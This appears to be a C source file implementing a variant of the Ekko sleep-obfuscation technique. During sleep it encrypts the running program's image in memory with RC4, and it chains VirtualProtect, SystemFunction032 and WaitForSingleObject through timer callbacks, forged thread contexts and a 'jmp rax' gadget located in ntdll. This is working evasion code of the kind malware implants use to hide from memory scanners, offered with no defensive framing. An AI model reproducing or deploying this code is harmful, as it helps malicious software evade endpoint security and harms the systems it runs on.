#include <Common.h>
#include <Ekko.h>
#include <Windows.h>
#include <psapi.h>
#include <winternl.h>


VOID EkkoObf( DWORD SleepTime )
{
    CONTEXT CtxThread   = { 0 };

    CONTEXT RopProtRW   = { 0 };
    CONTEXT RopMemEnc   = { 0 };
    CONTEXT RopDelay    = { 0 };
    CONTEXT RopMemDec   = { 0 };
    CONTEXT RopProtRX   = { 0 };
    CONTEXT RopSetEvt   = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvent      = NULL;
    PVOID   ImageBase   = NULL;
    DWORD   ImageSize   = 0;
    DWORD   OldProtect  = 0;

    // Can be randomly generated
    CHAR    KeyBuf[ 16 ]= { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
    USTRING Key         = { 0 };
    USTRING Img         = { 0 };

    PVOID   NtContinue  = NULL;
    PVOID   SysFunc032  = NULL;

    PVOID ntdll_jmprax = NULL;
    
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll + 4096;

    CHAR jmprax_bytecode[2] = {0xFF, 0xE0};


    for (LPVOID ntdll_cursor=ntdllBase;;ntdll_cursor++) {
        if (strncmp(ntdll_cursor, jmprax_bytecode, 2) == 0) {
            ntdll_jmprax = ntdll_cursor;
            break;
        }
    }


    PVOID ntdll_callzw = (PVOID)0x00007FFB300FDDD0;
    printf("(ntdll.dll) JMP RAX ->  %p\n", ntdll_jmprax);
    printf("(ntdll.dll) CALL ZwContinue -> %p FIND YOUR OWN WITH x64dbg\n", ntdll_callzw);

    hEvent      = CreateEventW( 0, 0, 0, 0 );
    hTimerQueue = CreateTimerQueue();

    SysFunc032  = GetProcAddress( LoadLibraryA( "Advapi32" ),  "SystemFunction032" );

    ImageBase   = GetModuleHandleA( NULL );
    ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;

    Key.Buffer  = KeyBuf;
    Key.Length  = Key.MaximumLength = 16;

    Img.Buffer  = ImageBase;
    Img.Length  = Img.MaximumLength = ImageSize;

    if ( CreateTimerQueueTimer( &hNewTimer, hTimerQueue, RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
    {
        WaitForSingleObject( hEvent, 0x32 );

        memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
        memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );

        // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        RopProtRW.Rsp  -= 8;
        RopProtRW.Rax   = VirtualProtect;
        RopProtRW.Rip   = ntdll_jmprax;
        RopProtRW.Rcx   = ImageBase;
        RopProtRW.Rdx   = ImageSize;
        RopProtRW.R8    = PAGE_READWRITE;
        RopProtRW.R9    = &OldProtect;

        // SystemFunction032( &Key, &Img );
        RopMemEnc.Rsp  -= 8;
        RopMemEnc.Rax   = SysFunc032;
        RopMemEnc.Rip   = ntdll_jmprax;
        RopMemEnc.Rcx   = &Img;
        RopMemEnc.Rdx   = &Key;

        // WaitForSingleObject( hTargetHdl, SleepTime );
        RopDelay.Rsp   -= 8;
        RopDelay.Rax    = WaitForSingleObject;
        RopDelay.Rip   = ntdll_jmprax;
        RopDelay.Rcx    = NtCurrentProcess();
        RopDelay.Rdx    = SleepTime;

        // SystemFunction032( &Key, &Img );
        RopMemDec.Rsp  -= 8;
        RopMemDec.Rax   = SysFunc032;
        RopMemDec.Rip   = ntdll_jmprax;
        RopMemDec.Rcx   = &Img;
        RopMemDec.Rdx   = &Key;

        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp  -= 8;
        RopProtRX.Rax   = VirtualProtect;
        RopProtRX.Rip   = ntdll_jmprax;
        RopProtRX.Rcx   = ImageBase;
        RopProtRX.Rdx   = ImageSize;
        RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9    = &OldProtect;

        // SetEvent( hEvent );
        RopSetEvt.Rsp  -= 8;
        RopSetEvt.Rax   = SetEvent;
        RopSetEvt.Rip   = ntdll_jmprax;
        RopSetEvt.Rcx   = hEvent;

        puts( "[INFO] Queue timers" );

        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, ntdll_callzw, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );

        puts( "[INFO] Wait for hEvent" );

        WaitForSingleObject( hEvent, INFINITE );

        puts( "[INFO] Finished waiting for event" );
    }

    DeleteTimerQueue( hTimerQueue );
}
